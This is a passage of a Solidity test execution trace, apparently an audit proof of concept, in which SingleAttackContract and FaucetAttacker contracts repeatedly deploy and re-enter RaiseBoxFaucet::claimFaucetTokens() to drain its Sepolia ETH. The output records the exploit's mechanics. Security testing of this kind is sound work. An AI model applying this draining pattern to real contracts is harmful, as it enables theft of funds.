    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 665000000000000000 [6.65e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x85653a338ea8fad8d202D8ACf9a23a35c3877DA9
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 67) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5680400] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5679641] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5643473] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5635815] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 660000000000000000 [6.6e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xa192a0f7Ce2B5280b0C58eAc1117e5b6b47cC64E
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 68) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5378431] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5377672] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5341504] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5333846] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
